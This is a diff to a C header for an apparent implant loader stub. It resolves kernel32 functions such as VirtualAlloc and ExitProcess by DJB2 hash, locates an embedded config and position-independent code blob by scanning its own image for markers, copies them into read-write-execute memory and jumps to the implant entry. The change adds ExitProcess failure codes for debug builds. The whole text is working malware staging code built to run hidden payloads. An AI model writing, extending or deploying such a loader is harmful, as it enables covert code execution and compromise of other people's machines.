@@ -389,20 +389,36 @@ static inline SIZE_T stub_get_image_size(PVOID image_base) {
 
 typedef void (__attribute__((ms_abi)) *fn_implant_entry)(PVOID param);
 
+/* Resolve ExitProcess for diagnostic exit codes in dev builds */
+static inline fn_VirtualAlloc stub_resolve_exitprocess(void) {
+    PVOID k32 = stub_find_module(HASH_KERNEL32_DLL);
+    if (!k32) return NULL;
+    /* DJB2("ExitProcess") = 0x024773DE */
+    return (fn_VirtualAlloc)stub_find_export(k32, 0x024773DE);
+}
+
+typedef void (__attribute__((ms_abi)) *fn_ExitProcess_stub)(DWORD code);
+
 static inline void stub_execute_payload(void) {
+    /* Resolve ExitProcess for debug exit codes */
+    fn_ExitProcess_stub pExit =
+        (fn_ExitProcess_stub)stub_resolve_exitprocess();
+
+    #define STUB_FAIL(code) do { if (pExit) pExit(code); return; } while(0)
+
     /* Step 1: Resolve VirtualAlloc */
     fn_VirtualAlloc pVirtualAlloc = stub_resolve_virtualalloc();
     if (!pVirtualAlloc)
-        return;
+        STUB_FAIL(100);
 
     /* Step 2: Get own image base + size for scanning */
     PVOID image_base = stub_get_image_base();
     if (!image_base)
-        return;
+        STUB_FAIL(101);
 
     SIZE_T image_size = stub_get_image_size(image_base);
     if (image_size == 0)
-        return;
+        STUB_FAIL(102);
 
     PBYTE base = (PBYTE)image_base;
 
@@ -410,7 +426,7 @@ static inline void stub_execute_payload(void) {
     PBYTE config_ptr = stub_find_marker_in_image(
         base, image_size, CONFIG_MARKER, CONFIG_MARKER_LEN);
     if (!config_ptr)
-        return;
+        STUB_FAIL(103);
 
     /* config_ptr now points to [max_size: u32 LE][config data...] */
     DWORD config_max_size = *(DWORD *)config_ptr;
@@ -422,27 +438,27 @@ static inline void stub_execute_payload(void) {
 
     /* Validate config length */
     if (config_len == 0 || config_len > config_max_size)
-        return;
+        STUB_FAIL(104);
 
     /* Step 4: Find PIC blob marker */
     PBYTE pic_ptr = stub_find_marker_in_image(
         base, image_size, PIC_MARKER, PIC_MARKER_LEN);
     if (!pic_ptr)
-        return;
+        STUB_FAIL(105);
 
     /* pic_ptr now points to [pic_size: u32 LE][pic data...] */
     DWORD pic_size = *(DWORD *)pic_ptr;
     PBYTE pic_data = pic_ptr + sizeof(DWORD);
 
     if (pic_size == 0)
-        return;
+        STUB_FAIL(106);
 
     /* Step 5: Allocate RWX memory for PIC blob + config */
     SIZE_T alloc_size = (SIZE_T)pic_size + sizeof(DWORD) + (SIZE_T)config_len;
     PVOID exec_mem = pVirtualAlloc(
         NULL, alloc_size, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
     if (!exec_mem)
-        return;
+        STUB_FAIL(107);
 
     /* Step 6: Copy PIC blob */
     stub_memcpy(exec_mem, pic_data, pic_size);
@@ -455,6 +471,8 @@ static inline void stub_execute_payload(void) {
     /* Step 8: Jump to PIC entry point */
     fn_implant_entry entry = (fn_implant_entry)exec_mem;
     entry(NULL);
+
+    #undef STUB_FAIL
 }
 
 #endif /* STUB_COMMON_H */
